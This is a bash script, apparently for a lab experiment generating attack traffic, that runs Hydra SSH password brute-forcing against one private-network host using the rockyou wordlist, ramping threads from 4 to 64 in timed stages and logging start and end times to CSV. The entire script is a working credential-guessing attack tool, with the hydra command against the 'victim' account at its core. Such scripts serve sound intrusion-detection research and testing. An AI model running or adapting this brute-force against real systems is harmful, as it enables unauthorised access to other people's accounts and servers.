#!/usr/bin/env bash
set -euo pipefail

# ===========================
#  RAMP-UP HYDRA STRESS TEST
# ===========================

### ===== CONFIG =====
VICTIM="192.168.67.12"      # HANYA 1 TARGET
ATTACKER_IP="192.168.67.67"

OUTBASE="/home/pros/test_results/critical"

RUN_DURATION=720            # durasi setiap stage

HYDRA_USER="victim"
HYDRA_WORDLIST="/home/pros/rockyou.txt"

# RAMP-UP STEPS
THREAD_STEPS=(4 8 16 32 64)

CHRONYC_BIN="$(command -v chronyc || true)"
### ==================

mkdir -p "$OUTBASE"

ATTACKS_CSV="$OUTBASE/attacks_log.csv"
if [ ! -f "$ATTACKS_CSV" ]; then
  echo "attack_id,attacker_ip,target,stage,threads,start_epoch,end_epoch,notes" > "$ATTACKS_CSV"
fi

PREFIX="att_critical"
i=1
while [ -d "$OUTBASE/${PREFIX}_${i}" ]; do
  i=$((i+1))
done
ATTACK_ID="${PREFIX}_${i}"
RUNDIR="$OUTBASE/$ATTACK_ID"
mkdir -p "$RUNDIR"

echo "[INFO] Attack run id: $ATTACK_ID"
echo "[INFO] Output dir: $RUNDIR"
echo "[INFO] Ramp-up stages: ${THREAD_STEPS[*]}"

# ==== TIME SYNC ====
if [ -n "$CHRONYC_BIN" ]; then
  echo "[TIME] chrony makestep..."
  $CHRONYC_BIN makestep >/dev/null 2>&1 || true
fi

# ==== METADATA ====
{
  echo "attack_id,$ATTACK_ID"
  echo "attacker_ip,$ATTACKER_IP"
  echo "target,$VICTIM"
  echo "notes,ramp-up test (single target)"
} > "$RUNDIR/metadata.txt"

stage=1

for T in "${THREAD_STEPS[@]}"; do
  echo ""
  echo "=============================================="
  echo "[STAGE $stage] Hydra $T threads → $VICTIM"
  echo "=============================================="

  STAGE_DIR="$RUNDIR/stage_${stage}_t${T}"
  mkdir -p "$STAGE_DIR"

  HYDRA_OUT="$STAGE_DIR/hydra.txt"

  START_EPOCH=$(date -u +%s)
  echo "[TIME] Stage $stage start epoch: $START_EPOCH"

  # ==== RUN HYDRA ONLY TO ONE TARGET ====
  timeout "${RUN_DURATION}s" hydra \
    -l "$HYDRA_USER" -P "$HYDRA_WORDLIST" -t "$T" \
    ssh://"$VICTIM" > "$HYDRA_OUT" 2>&1 &
  
  PID=$!

  wait $PID 2>/dev/null || true

  END_EPOCH=$(date -u +%s)
  echo "[TIME] Stage $stage end epoch: $END_EPOCH"

  # ==== SAVE STAGE METADATA ====
  {
    echo "stage,$stage"
    echo "threads,$T"
    echo "start_epoch,$START_EPOCH"
    echo "end_epoch,$END_EPOCH"
  } > "$STAGE_DIR/stage_meta.txt"

  # ==== GLOBAL CSV ====
  echo "${ATTACK_ID},${ATTACKER_IP},${VICTIM},${stage},${T},${START_EPOCH},${END_EPOCH},\"ramp-up-single\"" \
    >> "$ATTACKS_CSV"

  stage=$((stage+1))
done

echo ""
echo "[DONE] All stages completed."
echo "[INFO] Metadata saved at $RUNDIR"
echo "[INFO] CSV updated: $ATTACKS_CSV"
